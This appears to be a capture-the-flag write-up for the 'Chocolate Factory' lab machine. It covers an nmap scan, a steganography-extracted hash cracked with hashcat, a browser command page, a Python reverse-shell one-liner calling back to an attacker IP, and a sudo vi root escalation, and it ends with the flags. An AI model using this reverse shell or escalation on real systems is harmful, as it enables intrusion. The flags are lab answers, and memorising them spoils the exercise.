# Chocolate Factory
## nmap
```nmap
sudo nmap -T4 -sV -sC -oN nmap/scan 10.10.41.157
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-21 09:13 EST
Nmap scan report for 10.10.41.157
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.170.173
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
100/tcp open  newacct?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"

```

## Enumerate ftp

- Download image 'gum_room.jpg'
- Run `stegseek rockyou.txt gum_room.jpg`
- Find there is no password
- Decode b64 txt file: 
	- `charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::`

## Crack hash with hashcat 
- `hashcat -m 1800 rockyou.txt hash.txt -O`
- Retrieve credentials: 
	- `charlie:cn7824`

## Enumerate http
- Run dirbuster
- Discover `home.php` which allows us to run commands in the browser
- Forward to burp and discover files 
- Cat `validate.php` with full URL encoding to discover cracked password above
- Cat key_rev_key to discover the key `'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='`
- Attempt reverse shell with bash which fails
- Attempt reverse shell with python one liner (Refer to Payloadallthings github):
	- `python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.170.173",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`

## Foothold
- We are www-data
- Change user to charlie with retrieved credentials, fails
- Discover `teleport` file in /home/charlie
- Its ssh private key
- Save private key on attacker machine, chmod 600 ssh.key
- Run `ssh -i ssh.key charlie@10.10.243.163`
- Retrieve flag in /home/charlie/user.txt
	- `flag{cd5509042371b34e4826e4838b522d2e}`

## PrivEsc
- Run `sudo -l`
- Discover we can run vi with sudo privs
- Gtfo bin it `sudo vi -c ':!/bin/sh' /dev/null`
- Run `python -c 'import pty; pty.spawn ("/bin/bash")'` for better shell
- We are root
- Discover root.py in root directory
- Try running it with `python root.py`
- Enter the key found above
- Retrieve flag:
	- `flag{cec59161d338fef787fcb4e296b42124}`